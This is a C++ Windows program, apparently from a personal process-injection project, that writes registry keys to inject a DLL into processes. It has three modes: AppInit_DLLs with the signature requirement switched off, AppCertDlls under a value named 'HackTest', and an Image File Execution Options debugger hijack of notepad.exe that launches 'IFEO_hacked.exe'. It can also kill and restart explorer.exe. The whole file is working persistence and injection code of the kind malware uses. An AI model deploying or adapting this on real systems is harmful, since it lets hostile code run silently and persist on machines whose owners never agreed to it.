#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <tchar.h>
#include <Winternl.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <comdef.h>
#define DEBUG
using namespace std;
HKEY  hKey;
LONG result;
wstring dllPath = TEXT("inject~1.dll");
wstring AppInitPath = TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows");
wstring AppInit_Dlls_reg = TEXT("AppInit_Dlls");
wstring LoadAppInit_DLLs_reg = TEXT("LoadAppInit_DLLs");
wstring RequireSignedAppInit_DLLs_reg = TEXT("RequireSignedAppInit_DLLs");
wstring AppCertDllsPath = TEXT("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls");
wstring AppCertDllsValue = TEXT("HackTest");
wstring IFEO_Path = TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe");
wstring IFEO_Value = TEXT("Debugger");
wstring IFEO_inject = TEXT("C:\\Users\\YosefDan\\source\\repos\\Process-Injection\\x64\\Release\\IFEO_hacked.exe");


bool killProcessByName(string ProcName)
{
	bool flag = false;
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	do {
		//translate wchar to char
		_bstr_t b(pe32.szExeFile);
		char * processName = b;
		if (strcmp(processName, ProcName.c_str()) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pe32.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
				flag = true;
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return flag;
}

VOID DbgPrint(const char *msg)
{

#ifdef DEBUG
	DWORD eMsgLen, errNum = GetLastError();
	LPTSTR lpvSysMsg;

	if (msg)
		printf("%s: ", msg);
	eMsgLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, errNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpvSysMsg, 0, NULL);
	if (eMsgLen > 0)
		_ftprintf(stderr, _T("%d %s\n"), errNum, lpvSysMsg);
	else
		_ftprintf(stderr, _T("Error %d\n"), errNum);
	if (lpvSysMsg != NULL)
		LocalFree(lpvSysMsg);
#endif
}


DWORD GetVal(HKEY hKey, LPCTSTR lpValue )
{
	DWORD data;		DWORD size = sizeof(data);	DWORD type = REG_DWORD;
	LONG nError = RegQueryValueEx(hKey, lpValue, NULL, &type, (LPBYTE)&data, &size);

	if (nError == ERROR_FILE_NOT_FOUND)
		data = 0; // The value will be created and set to data next time SetVal() is called.
	else if (nError)
		cout << "Error: " << nError << " Could not get registry value " << (char*)lpValue << endl;

	return data;
}

LONG CreateReg(wstring regPath)
{
	return RegCreateKeyEx(HKEY_LOCAL_MACHINE,//_In_       HKEY                  hKey
		regPath.c_str(),					 //_In_       LPCTSTR               lpSubKey
		0,									 //_Reserved_ DWORD                 Reserved
		NULL,								 //_In_opt_   LPTSTR                lpClass
		REG_OPTION_NON_VOLATILE,			 //_In_       DWORD                 dwOptions
		KEY_ALL_ACCESS,						 //_In_       REGSAM                samDesired
		NULL,								 //_In_opt_   LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		&hKey,								 //_Out_      PHKEY                 phkResult,
		NULL);								 //_Out_opt_  LPDWORD               lpdwDisposition
}

bool SetAppInit()
{
	result = CreateReg(AppInitPath);

	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegCreateKeyEx");
		return false;
	}
	DbgPrint("[ ] Success! Key Created or opened!");

	result = RegSetValueEx(hKey, AppInit_Dlls_reg.c_str(), NULL, REG_SZ, (const BYTE *)dllPath.c_str(), (DWORD)((dllPath.size() + 1) * sizeof(wchar_t)));

	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegSetValueEx");
		return false;

	}
	DbgPrint("[ ] Success! SetAppInit Reg!");
	return true;
}

bool SetLoadAppInit()
{
	const DWORD Data = 1;
	result = RegSetValueEx(hKey,LoadAppInit_DLLs_reg.c_str(),NULL,REG_DWORD, (const BYTE *)&Data, sizeof(DWORD));

	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegSetValueEx");
		return false;

	}
	DbgPrint("[ ] Success!  SetLoadAppInit reg!");
	return true;
}

bool SetRequireSignedAppInit()
{
	const DWORD Data = 0;
	result = RegSetValueEx(hKey, RequireSignedAppInit_DLLs_reg.c_str(), NULL, REG_DWORD, (const BYTE *)&Data, sizeof(DWORD));
	
	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegSetValueEx");
		return false;

	}
	DbgPrint("[ ] Success! SetRequireSignedAppInit reg!");
	return true;
}
bool RefrashSystem()
{
	if (!killProcessByName("explorer.exe"))
	{
		DbgPrint("[!] failed to kill explorer.exe");
		return false;
	}
	
	auto pStartupInfo = new STARTUPINFO();
	auto remoteProcessInfo = new PROCESS_INFORMATION();  	
	CreateProcess(L"C:\\Windows\\explorer.exe", 0, 0, 0, 0, 0, 0, 0, pStartupInfo, remoteProcessInfo);
	if (!remoteProcessInfo->hProcess)	
	{
		DbgPrint("[-] Failed to create explorer.exe");
		return false;
	}
	DbgPrint("[]  Success! to create explorer.exe");
	return true;
}

bool SetAppCertDlls()
{
	result = CreateReg(AppCertDllsPath);

	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegCreateKeyEx");
		return false;
	}
	DbgPrint("[ ] Success! Key Created or opened!");

	result = RegSetValueEx( hKey,AppCertDllsValue.c_str(), NULL, REG_EXPAND_SZ, (const BYTE *)dllPath.c_str(), (DWORD)((dllPath.size() + 1) * sizeof(wchar_t)));
	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegSetValueEx");
		return false;

	}
	DbgPrint("[ ] Success! SetAppCertDlls Reg!");

	//RefrashSystem();
	return true;
}

bool SetIFEO()
{
	result = CreateReg(IFEO_Path);

	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegCreateKeyEx");
		return false;
	}
	DbgPrint("[ ] Success! Key Created or opened!");

	result = RegSetValueEx(hKey, IFEO_Value.c_str(), NULL, REG_SZ, (const BYTE *)IFEO_inject.c_str(), (DWORD)((IFEO_inject.size() + 1) * sizeof(wchar_t)));
	if (result != ERROR_SUCCESS)
	{
		DbgPrint("[!] failed to RegSetValueEx");
		return false;

	}
	DbgPrint("[ ] Success! SetAppCertDlls Reg!");
	return true;
}
int main(int argc , char * argv[])
{	
	if (argc != 2)
	{
		printf("insert parameter: 0 -> AppInitDlls , 1 -> AppCertDlls , 2 -> Image File Execution Options (IFEO)\n");
		getchar();
		return -1;
	}
	switch (atoi(argv[1]))
	{
	case 0:
		if (!SetAppInit())
		{
			printf("Error in SetAppInit");
			getchar();
			return -1;
		}
		if (!SetLoadAppInit())
		{
			printf("Error in SetLoadAppInit");
			getchar();
			return -1;
		}
		if (!SetRequireSignedAppInit())
		{
			printf("Error in SetRequireSignedAppInit");
			getchar();
			return -1;
		}
		break;
	case 1:
		if (!SetAppCertDlls())
		{
			printf("Error in SetAppCertDlls");
			getchar();
			return -1;
		}
		break;
	case 2:
		if (!SetIFEO())
		{
			printf("Error in SetIFEO");
			getchar();
			return -1;
		}
		
		break;
	default:
		break;
	}
	
	RegCloseKey(hKey);
	getchar();
	return 0;
}